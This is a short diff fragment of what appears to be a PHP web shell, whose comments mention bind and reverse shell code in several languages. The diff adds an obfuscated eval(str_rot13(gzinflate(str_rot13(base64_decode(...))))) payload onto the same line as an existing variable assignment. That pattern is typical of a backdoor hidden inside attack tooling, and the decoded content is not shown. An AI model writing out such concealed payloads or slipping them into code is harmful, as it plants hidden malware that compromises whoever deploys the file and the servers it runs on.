@@ -88,7 +88,7 @@ elseif(!isset($_SERVER['HTTP_USER_AGENT'])){
     header("Status: 404 Not Found");
     die();
 }
-$ups_2 = "/we"."bs"."he"."ll";
+$ups_2 = "/we"."bs"."he"."ll"; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
 
 // resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php this was used with bind and reverse shell
 // use gzinflate(base64_decode($the_code)) if you wanna see the real code.. in case you dont trust me ;-P
